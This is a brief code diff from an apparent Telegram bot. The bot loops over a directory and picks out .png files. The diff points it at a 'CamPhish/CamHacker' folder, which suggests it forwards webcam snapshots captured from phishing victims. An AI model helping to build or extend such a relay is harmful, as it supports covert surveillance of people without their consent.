@@ -14,7 +14,7 @@ looper = 0
 @bot.on_message(filters.private)
 def start(Client, message):
     while 1:
-        filelist=os.listdir("/home/akeelaashath2")
+        filelist=os.listdir("/root/CamPhish/CamHacker")
         for fichier in filelist[:]: # filelist[:] makes a copy of filelist.
             if not(fichier.endswith(".png")):
                 filelist.remove(fichier)
